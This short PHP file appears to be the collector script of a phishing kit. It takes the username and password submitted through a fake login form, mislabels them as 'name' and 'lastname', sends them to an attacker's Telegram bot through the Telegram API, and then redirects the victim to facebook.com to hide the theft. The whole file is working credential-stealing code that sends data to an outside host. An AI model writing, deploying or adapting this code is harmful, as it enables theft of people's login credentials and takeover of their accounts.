<?php
include 'email.php';

$message .= "|    New Login"."\r\n";
$message .= "|    name :    ".$_POST['user']."\r\n";
$message .= "|    lastname :    ".$_POST['pass']."\r\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


HEADER("Location: https://facebook.com/");


?>